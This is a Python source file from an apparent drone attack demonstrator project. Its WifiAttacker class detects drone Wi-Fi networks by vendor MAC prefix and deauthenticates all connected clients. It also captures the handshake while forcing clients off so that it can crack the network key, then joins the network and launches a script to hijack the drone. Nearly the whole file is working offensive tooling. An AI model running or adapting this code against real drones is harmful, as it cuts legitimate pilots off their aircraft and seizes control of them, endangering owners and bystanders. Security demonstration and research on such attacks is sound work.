#!/usr/bin/env python3
# -*- coding: utf-8 -*-

##############################################################################
# Owner     : Expleo Group
# Author    : Tarek AZAIZ
# Project   : Drones Attack Demonstrator
# Subject   : Deauthenticate a legitime user frome the target drone network
# Version   : 0.1
# Created   : 2022/03/31
# Modified  : 2022/05/04
##############################################################################


import pandas

from . wifi_nw_tools import *
from ..config.config import *
from .wifi_vendors import *
from ..drone import drone as d


class WifiAttacker():

    def __init__(self) -> None:
        pass



    def list_wifi_nw(self, capture_output=False) -> None:

        try:
            # prepare the network interface
            restore_interf()

            # start monitoring networks
            start_mon()

            # dump wifi networks
            dump_all_nw(hide_output = capture_output)

            # restore the interface
            restore_interf()
        except Exception as e:
            raise(Exception(f"{e}"))


    def detect_drones(self):

        try:
            # result targets list
            targets = []

            # dump all networks without output
            self.list_wifi_nw(capture_output=True)

            # get access points corresponding to drones
            targets = self.get_target_networks()
        
        except Exception as e:
            raise(Exception(f"{e}"))

        return targets



    def get_target_networks(self):
        """
        import the CSV file list of all availables networks and search
        inside for potential drones according to their mac adresses (OUI).
        return : 'targets' : a list of targets.
        Each target of this list is a list like this :
        ['vendor', 'essid', 'bssid', 'chan']
        """
        
        try:
            # import and sort the CSV dumping input file
            df = pandas.read_csv(CSV_NW_DUMP, usecols=[' Power', ' ESSID', 'BSSID', ' channel'])
            df.sort_values([" Power"], axis=0, ascending=[False], inplace=True)

            targets = []
            for idx, row in df.iterrows():
                chan    = str(row[' channel']).strip()
                bssid   = row['BSSID']
                essid   = str(row[' ESSID']).strip()
                oui     = bssid[0:8]
                vendor = get_vendor(oui)

                if (vendor != "" and essid != "") :
                    targets.append([vendor, essid, bssid, chan])
        
        except Exception as e:
            raise(Exception(f"{e}"))

        return targets


    def deauth_all_clients(self, targeted_drone : d.Drone
        , mng_interf=MNG_INTERF, mon_interf=MON_INTERF):
        
        ssid = targeted_drone.get_ssid()
        bssid = targeted_drone.get_bssid()
        chan = targeted_drone.get_channel()

        restore_interf(mng_interf)
        start_mon(chan, mng_interf)

        # dump the drone network to get clients connected
        dump_specific_nw(bssid, chan)

        # get the first client from the *.csv dump result
        clients = self.get_clients_bssid()

        for cli_bssid in clients:
            deauth_client(bssid, cli_bssid, ssid, mon_interf)


        restore_interf(mng_interf)



    def crack_wifi(self, targeted_drone : d.Drone
        , mng_interf=MNG_INTERF, mon_interf=MON_INTERF
        , duration=CLI_DUMP_DURATION):

        ssid = targeted_drone.get_ssid()
        ap_bssid = targeted_drone.get_bssid()
        chan = targeted_drone.get_channel()

        # device preparing
        restore_interf(mng_interf)
        start_mon(chan, mng_interf)

        # dump the drone network to get clients connected
        dump_specific_nw(ap_bssid, chan)

        # get the first client from the *.csv dump result
        cli_bssid = self.get_clients_bssid()

        if len(cli_bssid) == 0:
            print("No clients detected on targeted wifi. Can't crack the key.\n")
            input(">>> Press 'Enter' to continue... <<< ")
        else :

            # dumping thread
            t1 = threading.Thread(target=dump_specific_nw
                , args=(ap_bssid, chan, mon_interf, duration)
            )
            
            # deauth_client thread
            t2 = threading.Thread(target=deauth_client
                , args=(ap_bssid, cli_bssid[0], ssid, mon_interf)
            )
            
            print("Starting thread 1 : network dumping")
            t1.start()

            print("Starting thread 2 : deauthenticating legitimate clients")
            t2.start()

            t2.join()
            print("Thread 2 (deauthenticating) finished")

            t1.join()
            print("Thread 1 (network dumping) finished")
            
            # device state restoring
            restore_interf(mng_interf)

            # pre-shared key cracking
            crack(ap_bssid, ssid)

            input("\nPress 'Enter' to continue'")


    def connect(self):
        pass

    def get_clients_bssid(self, csv_dump=CSV_CLI_DUMP):
        """
        load the CSV dump file of the targeted network and return 
        the clients BBSID list
        """
        # list that will be returned as result
        clients_bssid = []
        # load the CSV dump file in a pandas dataframe
        df = pandas.read_csv(csv_dump, header=None)
        # separate the panda dataframe in two sections :
        # the first for the networks (begin by 'BSSID')
        # the second for the clients stations (begins by 'Station MAC')
        table_names = ['BSSID', 'Station MAC']
        groups = df[0].isin(table_names).cumsum()
        tables = {g.iloc[0,0]: g.iloc[1:] for k,g in df.groupby(groups)}

        # calculate the row indexes to access to clients list
        (nw,cli) = tables.items()
        nb_nw = len(nw[1]) # number of networks
        nb_cli = len(cli[1]) # number of clients
        first_cli_ind = nb_nw+2 # first "clients" row index
        last_cli_ind = first_cli_ind + nb_cli # last "clients" row index
        clients_table = cli[1] # clients table
        bssid_col = clients_table[0] # bssid col in the clients table
        
        # finaly, browse the bssid clients col and append to result
        for i in range (nb_nw+2, nb_nw+2+nb_cli):
            clients_bssid.append(bssid_col[i])

        return clients_bssid


 
    def hijack_drone(self, targeted_drone:d.Drone):
        
        """
        Attempt to connect to a target
        """

        # first, disconnect legitime users
        #self.deauth_all_clients()

        cmd = ["sudo", "iwconfig", MNG_INTERF, "essid"
            , targeted_drone.get_channel()]

        cmd = ["sudo", "nmcli", "d", "wifi", "connect"
            , targeted_drone.get_ssid(), "password", ""]

        progress = log.progress(
            "\n\nConnecting to targeted drone...")
        try:
            subprocess.run(cmd, capture_output=False)
        except Exception as e:
            progress .failure("\nError while trying to connect to target: ", format(e))
            raise(e)
        progress.success()


        """
        Attempt to hijack a drone (while already connected to it)
        """
        cmd = ['sudo', 'nodejs', BASE_DIR+"src/drone/drone_control/drone_hijack.js"]
        progress = log.progress(
            "\n\nHijacking the drone...")
        try:
            subprocess.run(cmd, capture_output=False)
        except Exception as e:
            progress .failure("\nError while trying to hijack the drone: ", format(e))
            raise(e)
        progress.success()
        
        input("\nPress enter to quit")



def main():
    wifi_attacker = WifiAttacker()


if __name__ == "__main__":
    main()
